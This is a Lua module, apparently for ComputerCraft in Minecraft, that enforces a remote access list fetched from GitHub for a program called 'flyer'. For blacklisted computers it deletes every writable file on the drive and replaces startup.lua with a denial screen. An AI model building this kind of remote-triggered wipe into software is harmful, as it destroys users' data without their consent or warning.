local ACCESS = {}

local REPO_URL = "https://raw.githubusercontent.com/Gelodix/flyer/main/"
local LIST_URL = REPO_URL .. "access_list.lua"
local DENIED_STARTUP_URL = REPO_URL .. "denied_startup.lua"

local FALLBACK_STARTUP = [[
local MESSAGE = "Your use of this software is unauthorized, for more info, contact Gelodix."

local function show(screen)
    local previous = term.redirect(screen)
    term.setBackgroundColor(colors.black)
    term.setTextColor(colors.red)
    term.clear()
    term.setCursorPos(1, 1)
    print(MESSAGE)
    term.setTextColor(colors.white)
    term.redirect(previous)
end

local monitor = peripheral.find("monitor")

if monitor then
    monitor.setTextScale(0.5)
    show(monitor)
end

show(term.current())
]]

local function fetchList(utils)
    local source, err, code = utils.download(LIST_URL)
    if not source then
        if code == 404 then return false, "no access list" end
        return nil, err
    end

    local chunk = load(source, "=access_list.lua", "t", {})
    local ok, list = false, nil
    if chunk then ok, list = pcall(chunk) end
    if not ok or type(list) ~= "table" or type(list.computers) ~= "table"
        or (list.mode ~= "whitelist" and list.mode ~= "blacklist") then
        return false, "invalid access list, ignored"  
    end
    return list
end

local function isListed(list, id)
    for _, listedId in ipairs(list.computers) do
        if listedId == id then return true end
    end
    return false
end

local function replaceStartup(utils)
    local replacement = utils.download(DENIED_STARTUP_URL)
    if not replacement or not load(replacement, "=startup.lua") then
        replacement = FALLBACK_STARTUP
    end

    utils.secureWriteFile("startup.lua", false, replacement, true)
end

local function wipe()
    for _, name in ipairs(fs.list("/")) do
        local path = "/" .. name
        if fs.getDrive(path) == "hdd" and not fs.isReadOnly(path) then
            fs.delete(path)
        end
    end 
end

-- return allowed (boolean), message (string), blacklist (boolean)
function ACCESS.check(utils)
    local list, info = fetchList(utils)

    if list == false then
        return true, info, true
    end

    if list then
        local listed = isListed(list, os.getComputerID())
        local allowed = (list.mode == "whitelist") == listed
        if allowed then
            return true, "access granted", false
        end

        return false, "access denied", list.mode == "blacklist"
    end

    return true, "access list unreachable(" .. tostring(info) .. ")", false
end

function ACCESS.enforce(utils)
    local allowed, message, blacklist = ACCESS.check(utils)
    if not allowed then
        if blacklist then
            wipe()
        end
        replaceStartup(utils)
    end
    return allowed, message
end